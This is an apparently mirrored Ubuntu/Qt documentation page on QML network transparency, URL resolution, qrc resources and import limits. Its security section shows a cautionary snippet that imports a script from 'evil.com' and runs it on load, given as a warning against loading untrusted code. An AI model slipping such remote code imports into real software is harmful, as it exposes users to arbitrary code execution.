<a href="https://developer.ubuntu.com/" class="logo-ubuntu"><img src="https://developer.ubuntu.com/assets/sites/ubuntu/latest/u/img/logos/logo-ubuntu-orange.svg" width="106" height="25" /> <span>developer</span></a>

-   [Jump to content](index.html#main-content)
-   [Desktop](https://developer.ubuntu.com/en/desktop/)
-   [Phone](https://developer.ubuntu.com/en/phone/)
-   [Core](https://developer.ubuntu.com/core)
-   [Community](https://developer.ubuntu.com/en/community/)
-   [Publish](https://developer.ubuntu.com/en/publish/)
-   [My Apps](https://myapps.developer.ubuntu.com/)

Search

<img src="https://developer.ubuntu.com/assets/sites/ubuntu/latest/u/img/search-white.svg" alt="Search" height="28" />

-   [APIs](../../../../index.html) ›
-   [Apps](../../../index.html) ›
-   [QML](../../index.html) ›
-   <a href="../index.html" class="sub-nav-item">SDK 15.04.3</a> ›
-   <a href="../QtQml/index.html" class="sub-nav-item">QtQml</a> ›

<!-- -->

-   Resource Loading and Network Transparency

Resource Loading and Network Transparency
=========================================

<span class="subtitle"></span>
<span id="details"></span>
QML supports network transparency by using URLs (rather than file names) for all references from a QML document to other content. This means that anywhere a URL source is expected, QML can handle remote resources as well as local ones, for example in the following image source:

``` qml
Image {
    source: "http://www.example.com/images/logo.png"
}
```

Since a *relative* URL is the same as a relative file, development of QML on regular file systems remains simple:

``` qml
Image {
    source: "images/logo.png"
}
```

Network transparency is supported throughout QML, for example:

-   Fonts - the `source` property of FontLoader is a URL
-   WebViews - the `url` property of WebView (obviously!)

Even QML types themselves can be on the network - if the Prototyping with qmlscene is used to load `http://example.com/mystuff/Hello.qml` and that content refers to a type "World", the engine will load `http://example.com/mystuff/qmldir` and resolve the type just as it would for a local file. For example if the qmldir file contains the line "World World.qml", it will load `http://example.com/mystuff/World.qml` Any other resources that `Hello.qml` referred to, usually by a relative URL, would similarly be loaded from the network.

<span id="relative-vs-absolute-urls"></span>
Relative vs. Absolute URLs
--------------------------

Whenever an object has a property of type URL (QUrl), assigning a string to that property will actually assign an absolute URL - by resolving the string against the URL of the document where the string is used.

For example, consider this content in `http://example.com/mystuff/test.qml`:

``` qml
Image {
    source: "images/logo.png"
}
```

The Image source property will be assigned `http://example.com/mystuff/images/logo.png`, but while the QML is being developed, in say `C:\User\Fred\Documents\MyStuff\test.qml`, it will be assigned `C:\User\Fred\Documents\MyStuff\images\logo.png`.

If the string assigned to a URL is already an absolute URL, then "resolving" does not change it and the URL is assigned directly.

<span id="qrc-resources"></span>
QRC Resources
-------------

One of the URL schemes built into Qt is the "qrc" scheme. This allows content to be compiled into the executable using The Qt Resource System. Using this, an executable can reference QML content that is compiled into the executable:

``` cpp
    QQuickView *view = new QQuickView;
    view->setUrl(QUrl("qrc:/dial.qml"));
```

The content itself can then use relative URLs, and so be transparently unaware that the content is compiled into the executable.

<span id="limitations"></span>
Limitations
-----------

The `import` statement is only network transparent if it has an "as" clause.

More specifically:

-   `import "dir"` only works on local file systems
-   `import libraryUri` only works on local file systems
-   `import "dir" as D` works network transparently
-   `import libraryUrl as U` works network transparently

<span id="implications-for-application-security"></span>
Implications for Application Security
-------------------------------------

The QML security model is that QML content is a chain of trusted content: the user installs QML content that they trust in the same way as they install native Qt applications, or programs written with runtimes such as Python and Perl. That trust is establish by any of a number of mechanisms, including the availability of package signing on some platforms.

In order to preserve the trust of users, QML application developers should not load and execute arbitrary JavaScript or QML resources. For example, consider the QML code below:

``` qml
import QtQuick 2.0
import "http://evil.com/evil.js" as Evil
Component {
    onLoaded: Evil.doEvil()
}
```

This is equivalent to downloading and executing "http://evil.com/evil.exe". **The QML engine will not prevent particular resources from being loaded**. Unlike JavaScript code that is run within a web browser, a QML application can load remote or local filesystem resources in the same way as any other native applications, so application developers must be careful in loading and executing any content.

As with any application accessing other content beyond its control, a QML application should perform appropriate checks on any untrusted data it loads. **Do not, for example, use `import`, Loader or [XMLHttpRequest](../QtQml.qtqml-javascript-qmlglobalobject/index.html#xmlhttprequest) to load any untrusted code or content.**

[Back to top](index.html#)

-   [Desktop](https://developer.ubuntu.com/en/desktop/)
    ---------------------------------------------------

    -   [Overview](https://developer.ubuntu.com/en/desktop/)
    -   [Get started](http://snapcraft.io/?utm_source=developer.ubuntu.com&utm_medium=devportal&utm_term=snaps%20snapcraft%20desktop&utm_content=menu&utm_campaign=duc_snappers)
    -   [Examples](https://github.com/ubuntu/snappy-playpen)

-   [Phone](https://developer.ubuntu.com/en/phone/)
    -----------------------------------------------

    -   [Overview](https://developer.ubuntu.com/en/phone/)
    -   [Scopes](https://developer.ubuntu.com/en/phone/scopes/)
    -   [Apps](https://developer.ubuntu.com/en/phone/apps/)
    -   [Web Apps](https://developer.ubuntu.com/en/phone/web/)
    -   [Platform](https://developer.ubuntu.com/en/phone/platform/)
    -   [Devices](https://developer.ubuntu.com/en/phone/devices/)

-   [Core](https://developer.ubuntu.com/core)
    -----------------------------------------

    -   [Overview](https://developer.ubuntu.com/core)
    -   [Get started](https://developer.ubuntu.com/core/get-started)
    -   [Tutorials](https://developer.ubuntu.com/core/tutorials)
    -   [Examples](https://developer.ubuntu.com/core/examples)
    -   [Publish and distribute](https://developer.ubuntu.com/core/publish-and-distribute)
    -   [Documentation](https://developer.ubuntu.com/core/documentation)
    -   [Troubleshooting](https://developer.ubuntu.com/core/troubleshooting)

-   [Community](https://developer.ubuntu.com/en/community/)
    -------------------------------------------------------

    -   [Overview](https://developer.ubuntu.com/en/community/)
    -   [App development training](https://developer.ubuntu.com/en/community/training/)
    -   [Core apps](https://developer.ubuntu.com/en/community/core-apps/)
    -   [Blog](https://developer.ubuntu.com/en/community/blog/)

-   [Publish](https://developer.ubuntu.com/en/publish/)
    ---------------------------------------------------

    -   [Overview](https://developer.ubuntu.com/en/publish/)
    -   [Application states](https://developer.ubuntu.com/en/publish/application-states/)
    -   [Packaging click apps](https://developer.ubuntu.com/en/publish/packaging-click-apps/)
    -   [Creating a good icon](https://developer.ubuntu.com/en/publish/creating-a-good-icon/)
    -   [Web](https://developer.ubuntu.com/en/publish/web/)
    -   [Security policy groups](https://developer.ubuntu.com/en/publish/security-policy-groups/)
    -   [Choosing a license](https://developer.ubuntu.com/en/publish/choosing-a-license/)
    -   [Other forms of submitting apps](https://developer.ubuntu.com/en/publish/other-forms-of-submitting-apps/)
    -   [Scopes](https://developer.ubuntu.com/en/publish/scopes/)

-   View in:
    --------

    -   [English](index.html "Change to language: English")
    -   [Simplified Chinese](index.html "Change to language: Simplified Chinese")

-   [Download](http://ubuntu.com/download/)
    ---------------------------------------

    -   [Overview](http://ubuntu.com/download)
    -   [Cloud](http://ubuntu.com/download/cloud)
    -   [Server](http://ubuntu.com/download/server)
    -   [Desktop](http://ubuntu.com/download/desktop)
    -   [Ubuntu Kylin](http://ubuntu.com/download/ubuntu-kylin)
    -   [Alternative downloads](http://ubuntu.com/download/alternative-downloads)

-   [Support](http://ubuntu.com/support/)
    -------------------------------------

    -   [Overview](http://ubuntu.com/support)
    -   [Security notices](http://www.ubuntu.com/usn/)

-   [About](http://ubuntu.com/about/)
    ---------------------------------

    -   [About Ubuntu](http://ubuntu.com/about/about-ubuntu)
    -   [Careers](http://www.canonical.com/careers)
    -   [Canonical and Ubuntu](http://ubuntu.com/about/canonical-and-ubuntu)
    -   [Contact us](http://ubuntu.com/about/contact-us)
    -   [Canonical news feed](http://insights.ubuntu.com/feed/)

© 2015 Canonical Ltd. Ubuntu and Canonical are registered trademarks of Canonical Ltd.

-   [Legal information](http://www.ubuntu.com/legal)
-   [Report a bug on this site](https://bugs.launchpad.net/developer-ubuntu-com/)

<span class="accessibility-aid">[Go to the top of the page](index.html#)</span>
